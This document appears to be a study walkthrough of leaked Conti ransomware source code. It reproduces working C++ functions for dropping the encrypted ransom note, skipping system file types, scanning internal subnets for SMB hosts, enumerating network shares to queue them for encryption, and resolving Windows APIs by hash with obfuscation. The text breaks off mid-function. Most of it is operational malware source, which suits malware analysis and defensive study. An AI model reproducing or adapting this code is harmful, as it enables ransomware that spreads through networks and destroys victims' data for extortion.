OBFW(L”perflogs”) 1234567891011121314- CheckFilename - check if the `file` is in the Blacklist, if yes then pass this file. This is to make sure the system running without breaking. - ``` OBFW(L&quot;.exe&quot;), OBFW(L&quot;.dll&quot;), OBFW(L&quot;.lnk&quot;), OBFW(L&quot;.sys&quot;), OBFW(L&quot;.msi&quot;), OBFW(L&quot;readme.txt&quot;), OBFW(L&quot;CONTI_LOG.txt&quot;), OBFW(L&quot;.bat&quot;) DropInstruction release the reame.txt to every directory that is encrypted by Ransomeware. the DecryptionNotes is encrypted with chacha the first 16 bytes is the key the 16-20 bytes is the iv the follow is the encrypted data SearchFiles DropInstruction12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849DropInstruction(__in std::wstring Directory){ LPCWSTR str = OBFW(L&quot;readme.txt&quot;); std::wstring Filename = MakePath(Directory, str); HANDLE hFile = pCreateFileW( Filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL); if (hFile == INVALID_HANDLE_VALUE) { return; } DWORD dwDecryptNote = 0; LPSTR DecryptNote = global::GetDecryptNote(); ECRYPT_ctx CryptCtx; BYTE ChaChaKey[32]; BYTE ChaChaIV[8]; memcpy(ChaChaKey, DecryptNote, 32); memcpy(ChaChaIV, DecryptNote + 32, 8); memcpy(&amp;dwDecryptNote, DecryptNote + 40, 4); LPSTR DecryptNotePlainText = (LPSTR)m_malloc(dwDecryptNote); if (!DecryptNotePlainText) { pCloseHandle(hFile); return; } RtlSecureZeroMemory(&amp;CryptCtx, sizeof(CryptCtx)); ECRYPT_keysetup(&amp;CryptCtx, ChaChaKey, 256, 64); ECRYPT_ivsetup(&amp;CryptCtx, ChaChaIV); ECRYPT_decrypt_bytes(&amp;CryptCtx, (PBYTE)DecryptNote + 44, (PBYTE)DecryptNotePlainText, dwDecryptNote); DWORD BytesWritten; pWriteFile(hFile, DecryptNotePlainText, dwDecryptNote, &amp;BytesWritten, NULL); pCloseHandle(hFile); RtlSecureZeroMemory(DecryptNotePlainText, dwDecryptNote); free(DecryptNotePlainText);} networkscannernetworkscannercomplex network scanner code. PortScanHandler pGetQueuedCompletionStatus pPostQueuedCompletionStatus START_COMPLETION_KEY CONNECT_COMPLETION_KEY TIMER_COMPLETION_KEY CancelIo Cancels all pending input and output (I/O) operations that are issued by the calling thread for the specified file. The function does not cancel I/O operations that other threads issue for a file handle. shutdown The shutdown function disables sends or receives on a socket. TimerCallback if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } 12345678910111213- a callback function that used with PostQueuedCompletionStatus. - ```c BOOL CreateTimerQueueTimer( [out] PHANDLE phNewTimer, [in, optional] HANDLE TimerQueue, [in] WAITORTIMERCALLBACK Callback, [in, optional] PVOID Parameter, [in] DWORD DueTime, [in] DWORD Period, [in] ULONG Flags ); The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time. so 30000 / 1000 = 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown and close the socket 123456789101112131415161718192021222324252627282930313233343536373839404142else if (CompletionStatus == TIMER_COMPLETION_KEY) { IsTimerActivated = TRUE; if (g_ActiveOperations) { PCONNECT_CONTEXT ConnectCtx = NULL; TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) { if (ConnectCtx-&gt;State == CONNECTING) { pCancelIo((HANDLE)ConnectCtx-&gt;s); } } } else { while (!TAILQ_EMPTY(&amp;g_ConnectionList)) { PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList); pshutdown(ConnectCtx-&gt;s, SD_SEND); pclosesocket(ConnectCtx-&gt;s); TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries); pGlobalFree(ConnectCtx); } if (!CreateHostTable()) { break; } ScanHosts(); if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } IsTimerActivated = FALSE; } }} EnumShares NetShareEnum Retrieves information about each shared resource on a server. sharepath Constant/value Description STYPE_DISKTREE0x00000000 Disk drive STYPE_SPECIAL0x80000000 Special share reserved for interprocess communication (IPC$) or remote administration of the server (ADMIN$). Can also refer to administrative shares such as C$, D$, E$, and so forth. STYPE_TEMPORARY0x40000000 A temporary share that is not persisted for creation each time the file server initializes. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051VOIDnetwork_scanner::EnumShares( __in PWCHAR pwszIpAddress, __out PSHARE_LIST ShareList ){ NET_API_STATUS Result; LPSHARE_INFO_1 ShareInfoBuffer = NULL; DWORD er = 0, tr = 0, resume = 0;; do { Result = (NET_API_STATUS)pNetShareEnum(pwszIpAddress, 1, (LPBYTE*)&amp;ShareInfoBuffer, MAX_PREFERRED_LENGTH, &amp;er, &amp;tr, &amp;resume); if (Result == ERROR_SUCCESS) { LPSHARE_INFO_1 TempShareInfo = ShareInfoBuffer; for (DWORD i = 1; i &lt;= er; i++) { if (TempShareInfo-&gt;shi1_type == STYPE_DISKTREE || TempShareInfo-&gt;shi1_type == STYPE_SPECIAL || TempShareInfo-&gt;shi1_type == STYPE_TEMPORARY) { PSHARE_INFO ShareInfo = (PSHARE_INFO)m_malloc(sizeof(SHARE_INFO)); if (ShareInfo &amp;&amp; plstrcmpiW(TempShareInfo-&gt;shi1_netname, OBFW(L&quot;ADMIN$&quot;))) { plstrcpyW(ShareInfo-&gt;wszSharePath, OBFW(L&quot;\\\\\\\\&quot;)); plstrcatW(ShareInfo-&gt;wszSharePath, pwszIpAddress); plstrcatW(ShareInfo-&gt;wszSharePath, OBFW(L&quot;\\\\&quot;)); plstrcatW(ShareInfo-&gt;wszSharePath, TempShareInfo-&gt;shi1_netname); logs::Write(OBFW(L&quot;Found share %s.&quot;), ShareInfo-&gt;wszSharePath); TAILQ_INSERT_TAIL(ShareList, ShareInfo, Entries); } } TempShareInfo++; } pNetApiBufferFree(ShareInfoBuffer); } } while (Result == ERROR_MORE_DATA);} StartScan1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374network_scanner::StartScan(){ WSADATA WsaData; HANDLE hHostHandler = NULL, hPortScan = NULL; PSUBNET_INFO SubnetInfo = NULL; g_ActiveOperations = 0; pWSAStartup(MAKEWORD(2, 2), &amp;WsaData); pInitializeCriticalSection(&amp;g_CriticalSection); if (!GetConnectEX()) { logs::Write(OBFW(L&quot;Can't get ConnectEx.&quot;)); goto cleanup; } GetCurrentIpAddress(); g_IocpHandle = pCreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, NULL, 0); if (g_IocpHandle == NULL) { logs::Write(OBFW(L&quot;Can't create io completion port.&quot;)); goto cleanup; } TAILQ_INIT(&amp;g_SubnetList); TAILQ_INIT(&amp;g_HostList); TAILQ_INIT(&amp;g_ConnectionList); if (!GetSubnets(&amp;g_SubnetList)) { logs::Write(OBFW(L&quot;Can't get subnets.&quot;)); goto cleanup; } hHostHandler = pCreateThread(NULL, 0, &amp;HostHandler, NULL, 0, NULL); if (hHostHandler == INVALID_HANDLE_VALUE) { logs::Write(OBFW(L&quot;Can't create host thread.&quot;)); goto cleanup; } hPortScan = pCreateThread(NULL, 0, &amp;PortScanHandler, NULL, 0, NULL); if (hPortScan == INVALID_HANDLE_VALUE) { logs::Write(OBFW(L&quot;Can't create port scan thread.&quot;)); goto cleanup; } pPostQueuedCompletionStatus(g_IocpHandle, 0, START_COMPLETION_KEY, NULL); pWaitForSingleObject(hPortScan, INFINITE); AddHost(STOP_MARKER); pWaitForSingleObject(hHostHandler, INFINITE);cleanup: pDeleteCriticalSection(&amp;g_CriticalSection); if (g_IocpHandle) { pCloseHandle(g_IocpHandle); } if (hHostHandler) { pCloseHandle(hHostHandler); } if (hPortScan) { pCloseHandle(hPortScan); } pWSACleanup();} GetCurrentIpAddress pgethostname SOCKET_ERROR == (INT)pgethostname(szHostName, 256) g_HostEntry = (struct hostent*)pgethostbyname(szHostName); If no error occurs, gethostname returns zero. Otherwise, it returns SOCKET_ERROR and a specific error code can be retrieved by calling WSAGetLastError. 1234567891011121314151617STATICDWORD GetCurrentIpAddress(){ CHAR szHostName[256]; struct in_addr InAddr; if (SOCKET_ERROR == (INT)pgethostname(szHostName, 256)) { return 0; } g_HostEntry = (struct hostent*)pgethostbyname(szHostName); if (!g_HostEntry) { return 0; } return 0;} GetConnectEX WSASocketW creates a socket that is bound to a specific transport-service provider WSAIoctl controls the mode of a socket. closesocket 1234567891011121314151617181920212223242526STATICBOOLGetConnectEX(){ DWORD dwBytes; int rc; SOCKET sock = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); if (sock == INVALID_SOCKET) return FALSE; GUID guid = WSAID_CONNECTEX; rc = (int)pWSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER, &amp;guid, sizeof(guid), &amp;g_ConnectEx, sizeof(g_ConnectEx), &amp;dwBytes, NULL, NULL); if (rc != 0) return FALSE; rc =(int) pclosesocket(sock); if (rc != 0) return FALSE; return TRUE;} GetSubnets GetIpNetTable GetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the table size) ULONG Result = (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the result) The GetIfTable function retrieves the MIB-II interface table. if the ip is start with “172.”,”192.168.”,”10.”,”169.”, there are subnets in this host. And check if the subnet is already in the SubnetList . If not , add this SubnetInfo into SubnetList 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475 IpNetTable = (PMIB_IPNETTABLE)m_malloc(TableSize); if (!IpNetTable) { return FALSE; } ULONG Result = (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE); if (Result != ERROR_SUCCESS) { logs::Write(OBFW(L&quot;GetIpNetTable fails. GetLastError = %lu&quot;), pGetLastError()); free(IpNetTable); return FALSE; } for (ULONG i = 0; i &lt; IpNetTable-&gt;dwNumEntries; i++) { WCHAR wszIpAddress[INET_ADDRSTRLEN]; ULONG dwAddress = IpNetTable-&gt;table[i].dwAddr; PUCHAR HardwareAddres = IpNetTable-&gt;table[i].bPhysAddr; ULONG HardwareAddressSize = IpNetTable-&gt;table[i].dwPhysAddrLen; RtlSecureZeroMemory(wszIpAddress, sizeof(wszIpAddress)); IN_ADDR InAddr; InAddr.S_un.S_addr = dwAddress; PCHAR szIpAddress = pinet_ntoa(InAddr); DWORD le = WSAGetLastError(); PCSTR p1 = (PCSTR)pStrStrIA(szIpAddress, OBFA(&quot;172.&quot;)); PCSTR p2 = (PCSTR)pStrStrIA(szIpAddress, OBFA(&quot;192.168.&quot;)); PCSTR p3 = (PCSTR)pStrStrIA(szIpAddress, OBFA(&quot;10.&quot;)); PCSTR p4 = (PCSTR)pStrStrIA(szIpAddress, OBFA(&quot;169.&quot;)); if (p1 == szIpAddress || p2 == szIpAddress || p3 == szIpAddress || p4 == szIpAddress) { BOOL Found = FALSE; PSUBNET_INFO SubnetInfo = NULL; TAILQ_FOREACH(SubnetInfo, SubnetList, Entries) { if (!memcmp(&amp;SubnetInfo-&gt;dwAddress, &amp;dwAddress, 3)) { Found = TRUE; break; } } if (!Found) { BYTE bAddres[4]; *(ULONG*)bAddres = dwAddress; bAddres[3] = 0; PSUBNET_INFO NewSubnet = (PSUBNET_INFO)m_malloc(sizeof(SUBNET_INFO)); if (!NewSubnet) { break; } RtlCopyMemory(&amp;NewSubnet-&gt;dwAddress, bAddres, 4); TAILQ_INSERT_TAIL(SubnetList, NewSubnet, Entries); } } } free(IpNetTable); return TRUE;} HostHandler pEnterCriticalSection(&amp;g_CriticalSection); When more than one processes access a same code segment that segment is known as critical section. Critical section contains shared variables or resources which are needed to be synchronized to maintain consistency of data variable.Critical Section in Synchronization ```c pEnterCriticalSection(&amp;g_CriticalSection); PHOST_INFO HostInfo = TAILQ_FIRST(&amp;g_HostList); if (HostInfo == NULL) { pLeaveCriticalSection(&amp;g_CriticalSection); pSleep(1000); continue; } TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries); pLeaveCriticalSection(&amp;g_CriticalSection); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758- `network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList);` - get the host's shareinfo - `threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath);````cSTATICDWORDWINAPIHostHandler(__in PVOID pArg){ network_scanner::SHARE_LIST ShareList; TAILQ_INIT(&amp;ShareList); while (TRUE) { pEnterCriticalSection(&amp;g_CriticalSection); PHOST_INFO HostInfo = TAILQ_FIRST(&amp;g_HostList); if (HostInfo == NULL) { pLeaveCriticalSection(&amp;g_CriticalSection); pSleep(1000); continue; } TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries); pLeaveCriticalSection(&amp;g_CriticalSection); if (HostInfo-&gt;dwAddres == STOP_MARKER) { free(HostInfo); pExitThread(EXIT_SUCCESS); } network_scanner::EnumShares(HostInfo-&gt;wszAddress, &amp;ShareList); while (!TAILQ_EMPTY(&amp;ShareList)) { network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&amp;ShareList); logs::Write(OBFW(L&quot;Starting search on share %s.&quot;), ShareInfo-&gt;wszSharePath); threadpool::PutTask(threadpool::NETWORK_THREADPOOL, ShareInfo-&gt;wszSharePath); TAILQ_REMOVE(&amp;ShareList, ShareInfo, Entries); free(ShareInfo); } free(HostInfo); } pExitThread(EXIT_SUCCESS); return EXIT_SUCCESS;} CreateHostTable WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED); socket with tcp bind The bind function associates a local address with a socket. CreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0) Creates an input/output (I/O) completion port and associates it with a specified file handle, or creates an I/O completion port that is not yet associated with a file handle, allowing association at a later time. If the function succeeds, the return value is the handle to an I/O completion port 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263STATICBOOLCreateHostTable(){ PSUBNET_INFO SubnetInfo = TAILQ_FIRST(&amp;g_SubnetList); if (!SubnetInfo) { return FALSE; } BYTE bAddres[4]; DWORD dwAddress; RtlCopyMemory(bAddres, &amp;SubnetInfo-&gt;dwAddress, 4); for (BYTE i = 0; i &lt; 255; i++) { bAddres[3] = i; RtlCopyMemory(&amp;dwAddress, bAddres, 4); PCONNECT_CONTEXT ConnectCtx = (PCONNECT_CONTEXT)pGlobalAlloc(GPTR, sizeof(CONNECT_CONTEXT)); if (!ConnectCtx) { break; } ConnectCtx-&gt;dwAddres = dwAddress; ConnectCtx-&gt;State = NOT_CONNECTED; ConnectCtx-&gt;s = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED); if (ConnectCtx-&gt;s == INVALID_SOCKET) { pGlobalFree(ConnectCtx); continue; } SOCKADDR_IN SockAddr; RtlSecureZeroMemory(&amp;SockAddr, sizeof(SockAddr)); SockAddr.sin_family = AF_INET; SockAddr.sin_port = 0; SockAddr.sin_addr.s_addr = INADDR_ANY; if (pbind(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, sizeof(SockAddr)) != ERROR_SUCCESS) { pclosesocket(ConnectCtx-&gt;s); pGlobalFree(ConnectCtx); continue; } if (!pCreateIoCompletionPort((HANDLE)ConnectCtx-&gt;s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)) { pclosesocket(ConnectCtx-&gt;s); pGlobalFree(ConnectCtx); continue; } TAILQ_INSERT_TAIL(&amp;g_ConnectionList, ConnectCtx, Entries); } TAILQ_REMOVE(&amp;g_SubnetList, SubnetInfo, Entries); free(SubnetInfo); return TRUE;} ScanHosts ConnectEx The ConnectEx function establishes a connection to a specified socket, and optionally sends data once the connection is established. The ConnectEx function is only supported on connection-oriented sockets. ``` LPFN_CONNECTEX LpfnConnectex; BOOL LpfnConnectex([in] SOCKET s,[in] const sockaddr *name,[in] int namelen,[in, optional] PVOID lpSendBuffer,[in] DWORD dwSendDataLength,[out] LPDWORD lpdwBytesSent,[in] LPOVERLAPPED lpOverlapped ) {…} 123456789101112131415161718192021222324252627282930```cSTATICVOIDScanHosts(){ PCONNECT_CONTEXT ConnectCtx = NULL; TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) { DWORD dwBytesSent; SOCKADDR_IN SockAddr; RtlSecureZeroMemory(&amp;SockAddr, sizeof(SockAddr)); SockAddr.sin_family = AF_INET; SockAddr.sin_port = htons(SMB_PORT); SockAddr.sin_addr.s_addr = ConnectCtx-&gt;dwAddres; if (g_ConnectEx(ConnectCtx-&gt;s, (CONST SOCKADDR*) &amp; SockAddr, sizeof(SockAddr), NULL, 0, &amp;dwBytesSent, (LPOVERLAPPED)ConnectCtx)) { ConnectCtx-&gt;State = CONNECTED; AddHost(ConnectCtx-&gt;dwAddres); } else if (WSA_IO_PENDING == WSAGetLastError()) { g_ActiveOperations++; ConnectCtx-&gt;State = CONNECTING; } }} AddHost add the new-found host to the Host table 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849STATICBOOLAddHost( __in DWORD dwAddres){ if (g_HostEntry) { INT i = 0; while (g_HostEntry-&gt;h_addr_list[i] != NULL) { DWORD dwCurrentAddr = *(DWORD*)g_HostEntry-&gt;h_addr_list[i++]; if (dwCurrentAddr == dwAddres) { return FALSE; } } } PHOST_INFO HostInfo = (PHOST_INFO)m_malloc(sizeof(HOST_INFO)); if (!HostInfo) { return FALSE; } DWORD dwAddress = INET_ADDRSTRLEN; SOCKADDR_IN temp; temp.sin_addr.s_addr = dwAddres; temp.sin_port = 0; temp.sin_family = AF_INET; HostInfo-&gt;dwAddres = dwAddres; if (dwAddres != STOP_MARKER) { if (SOCKET_ERROR == pWSAAddressToStringW((LPSOCKADDR)&amp;temp, sizeof(temp), NULL, HostInfo-&gt;wszAddress, &amp;dwAddres)) { free(HostInfo); return FALSE; } } pEnterCriticalSection(&amp;g_CriticalSection); { TAILQ_INSERT_TAIL(&amp;g_HostList, HostInfo, Entries); } pLeaveCriticalSection(&amp;g_CriticalSection); return TRUE;} PortScanHandlerthis handler use the CompletionStatus,IsTimerActivated,g_ActiveOperations to control the code flow. g_ActiveOperations use to count the Socket. ScanHosts function: when one host is found ,the value is add by one if CompletionStatus == CONNECT_COMPLETION_KEY, the value sub by one. IsTimerActivated used to check after the timer. IsTimerActivated is True, four scenes CompletionStatus == CONNECT_COMPLETION_KEY and CompleteAsyncConnect Success if g_ActiveOperations is zero ,then scanHost again 12345678910111213141516171819202122232425if (!g_ActiveOperations &amp;&amp; IsTimerActivated) { while (!TAILQ_EMPTY(&amp;g_ConnectionList)) { PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList); pshutdown(ConnectCtx-&gt;s, SD_SEND); pclosesocket(ConnectCtx-&gt;s); TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries); pGlobalFree(ConnectCtx); } if (!CreateHostTable()) { break; } ScanHosts(); if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } IsTimerActivated = FALSE; } if (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) { ConnectContext-&gt;State = CONNECTED; AddHost(ConnectContext-&gt;dwAddres); } CompletionStatus == CONNECT_COMPLETION_KEY and CompleteAsyncConnect fail the same as before 12345else { ConnectContext-&gt;State = NOT_CONNECTED; } CompletionStatus == TIMER_COMPLETION_KEY and g_ActiveOperations, so the connecting is Active.We can Cancel it now. 123456789101112if (g_ActiveOperations) { PCONNECT_CONTEXT ConnectCtx = NULL; TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) { if (ConnectCtx-&gt;State == CONNECTING) { pCancelIo((HANDLE)ConnectCtx-&gt;s); } } } CompletionStatus == TIMER_COMPLETION_KEY and g_ActiveOperations == 0 , the socket is out-of-time. 123456789101112131415161718192021222324else { while (!TAILQ_EMPTY(&amp;g_ConnectionList)) { PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList); pshutdown(ConnectCtx-&gt;s, SD_SEND); pclosesocket(ConnectCtx-&gt;s); TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries); pGlobalFree(ConnectCtx); } if (!CreateHostTable()) { break; } ScanHosts(); if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } IsTimerActivated = FALSE; } CompletionStatus A pointer to a variable that receives the completion key value associated with the file handle whose I/O operation has completed. A completion key is a per-file key that is specified in a call to CreateIoCompletionPort. START_COMPLETION_KEY CONNECT_COMPLETION_KEY TIMER_COMPLETION_KEY PortScanHandler pGetQueuedCompletionStatus pPostQueuedCompletionStatus CancelIo Cancels all pending input and output (I/O) operations that are issued by the calling thread for the specified file. The function does not cancel I/O operations that other threads issue for a file handle. shutdown The shutdown function disables sends or receives on a socket. TimerCallback if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } 12345678910111213- a callback function that used with PostQueuedCompletionStatus. - ```c BOOL CreateTimerQueueTimer( [out] PHANDLE phNewTimer, [in, optional] HANDLE TimerQueue, [in] WAITORTIMERCALLBACK Callback, [in, optional] PVOID Parameter, [in] DWORD DueTime, [in] DWORD Period, [in] ULONG Flags ); The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time. so 30000 / 1000 = 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown or close the socket 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125STATICDWORDWINAPIPortScanHandler(PVOID pArg){ g_ActiveOperations = 0; HANDLE hTimer = NULL; BOOL IsTimerActivated = FALSE; HANDLE hTimerQueue = pCreateTimerQueue(); if (!hTimerQueue) { pExitThread(EXIT_FAILURE); } while (TRUE) { DWORD dwBytesTransferred; ULONG_PTR CompletionStatus; PCONNECT_CONTEXT ConnectContext; BOOL Success = (BOOL)pGetQueuedCompletionStatus(g_IocpHandle, &amp;dwBytesTransferred, &amp;CompletionStatus, (LPOVERLAPPED*)&amp;ConnectContext, INFINITE); if (CompletionStatus == START_COMPLETION_KEY) { if (!CreateHostTable()) { break; } ScanHosts(); if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } IsTimerActivated = FALSE; } else if (CompletionStatus == CONNECT_COMPLETION_KEY) { g_ActiveOperations--; if (Success &amp;&amp; CompleteAsyncConnect(ConnectContext-&gt;s)) { ConnectContext-&gt;State = CONNECTED; AddHost(ConnectContext-&gt;dwAddres); } else { ConnectContext-&gt;State = NOT_CONNECTED; } if (!g_ActiveOperations &amp;&amp; IsTimerActivated) { while (!TAILQ_EMPTY(&amp;g_ConnectionList)) { PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList); pshutdown(ConnectCtx-&gt;s, SD_SEND); pclosesocket(ConnectCtx-&gt;s); TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries); pGlobalFree(ConnectCtx); } if (!CreateHostTable()) { break; } ScanHosts(); if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } IsTimerActivated = FALSE; } } else if (CompletionStatus == TIMER_COMPLETION_KEY) { IsTimerActivated = TRUE; if (g_ActiveOperations) { PCONNECT_CONTEXT ConnectCtx = NULL; TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) { if (ConnectCtx-&gt;State == CONNECTING) { pCancelIo((HANDLE)ConnectCtx-&gt;s); } } } else { while (!TAILQ_EMPTY(&amp;g_ConnectionList)) { PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList); pshutdown(ConnectCtx-&gt;s, SD_SEND); pclosesocket(ConnectCtx-&gt;s); TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries); pGlobalFree(ConnectCtx); } if (!CreateHostTable()) { break; } ScanHosts(); if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) { pExitThread(EXIT_FAILURE); } IsTimerActivated = FALSE; } } } pDeleteTimerQueue(hTimerQueue); pExitThread(EXIT_SUCCESS); return EXIT_SUCCESS;} Reference: MSDN [Critical Section in Synchronization]( apigetapi #define KERNEL32DLL_HASH 0xb26771d8 #define LOADLIBRARYA_HASH 0x439c7e33 getapi::IsRestartManagerLoaded，getapi::SetRestartManagerLoaded function is used to KillFileOwner function.It will check if Rstrtmgr.dll is loaded. self-realize function such as my_stoi、FindChar、m_memcpy、StrLen getapi::InitializeGetapiModulefirst generate the function LoadlibraryA GetKernel32 GetApiAddr 12345678910111213141516171819202122232425getapi::InitializeGetapiModule(){ g_hKernel32 = GetKernel32(); morphcode(g_hKernel32); ADDR dwLoadLibraryA; pLoadLibraryA = (fnLoadLibraryA)GetApiAddr(g_hKernel32, LOADLIBRARYA_HASH, &amp;dwLoadLibraryA); morphcode(pLoadLibraryA); if (!pLoadLibraryA) { return FALSE; } g_ApiCache = (LPVOID*)malloc(API_CACHE_SIZE); morphcode(g_ApiCache); if (!g_ApiCache) { return FALSE; } RtlSecureZeroMemory(g_ApiCache, API_CACHE_SIZE); return TRUE;} getapi::GetProcAddressExGetProcAddress by the ModuleName or the ModuleId follow. 1234567891011121314enum MODULES { KERNEL32_MODULE_ID = 15, ADVAPI32_MODULE_ID, NETAPI32_MODULE_ID, IPHLPAPI_MODULE_ID, RSTRTMGR_MODULE_ID, USER32_MODULE_ID, WS2_32_MODULE_ID, SHLWAPI_MODULE_ID, SHELL32_MODULE_ID, OLE32_MODULE_ID, OLEAUT32_MODULE_ID, NTDLL_MODULE_ID}; pLoadLibraryA GetApiAddr get the api function address by the Hash argument 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122LPVOIDgetapi::GetProcAddressEx( __in LPCSTR ModuleName, __in DWORD ModuleId, __in DWORD Hash ){ HMODULE hModule = NULL; ADDR ProcAddress = NULL; LPCSTR Advapi32DLL = OBFA(&quot;Advapi32.dll&quot;); LPCSTR Kernel32DLL = OBFA(&quot;Kernel32.dll&quot;); LPCSTR Netapi32DLL = OBFA(&quot;Netapi32.dll&quot;); LPCSTR IphlpapiDLL = OBFA(&quot;Iphlpapi.dll&quot;); LPCSTR RstrtmgrDLL = OBFA(&quot;Rstrtmgr.dll&quot;); LPCSTR Ws2_32DLL = OBFA(&quot;ws2_32.dll&quot;); LPCSTR User32DLL = OBFA(&quot;User32.dll&quot;); LPCSTR ShlwapiDLL = OBFA(&quot;Shlwapi.dll&quot;); LPCSTR Shell32DLL = OBFA(&quot;Shell32.dll&quot;); LPCSTR Ole32DLL = OBFA(&quot;Ole32.dll&quot;); LPCSTR OleAut32DLL = OBFA(&quot;OleAut32.dll&quot;); LPCSTR NtdllDLL = OBFA(&quot;ntdll.dll&quot;); if (ModuleName) { morphcode((char*)ModuleName); hModule = pLoadLibraryA(ModuleName); morphcode(hModule); if (hModule) { ProcAddress = GetApiAddr(hModule, Hash, &amp;ProcAddress); morphcode(ProcAddress); return (LPVOID)ProcAddress; } return (LPVOID)0; } else { switch (ModuleId) { case KERNEL32_MODULE_ID: ModuleName = Kernel32DLL; break; case ADVAPI32_MODULE_ID: ModuleName = Advapi32DLL; break; case NETAPI32_MODULE_ID: ModuleName = Netapi32DLL; break; case IPHLPAPI_MODULE_ID: ModuleName = IphlpapiDLL; break; case RSTRTMGR_MODULE_ID: ModuleName = RstrtmgrDLL; break; case USER32_MODULE_ID: ModuleName = User32DLL; break; case WS2_32_MODULE_ID: ModuleName = Ws2_32DLL; break; case SHLWAPI_MODULE_ID: ModuleName = ShlwapiDLL; break; case SHELL32_MODULE_ID: ModuleName = Shell32DLL; break; case OLE32_MODULE_ID: ModuleName = Ole32DLL; break; case OLEAUT32_MODULE_ID: ModuleName = OleAut32DLL; break; case NTDLL_MODULE_ID: ModuleName = NtdllDLL; break; default: return (LPVOID)0; } hModule = pLoadLibraryA(ModuleName); morphcode(hModule); if (hModule) { ProcAddress = GetApiAddr(hModule, Hash, &amp;ProcAddress); morphcode(ProcAddress); return (LPVOID)ProcAddress; } } return (LPVOID)0;} getapi::GetProcAddressEx2get the api function address by Hash 1pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1cae2a52, 109);//GetProcAddress(hKernel32, OBFA(&quot;CancelIo&quot;)); the ApiCache is to forbid call GetProcAddressEx twice for the same function. 1234567891011121314151617181920212223242526LPVOID getapi::GetProcAddressEx2( __in LPSTR Dll, __in DWORD ModuleId, __in DWORD Hash, __in int CacheIndex ){ // 泽黻鲨 忸玮疣弪 噤疱?趔黻鲨?桉镱朦珞 挲? LPVOID Addr = NULL; Addr = g_ApiCache[CacheIndex]; morphcode(Addr); if (!Addr) { // 泽黻鲨?礤??挲. 项塍鬣屐 甯 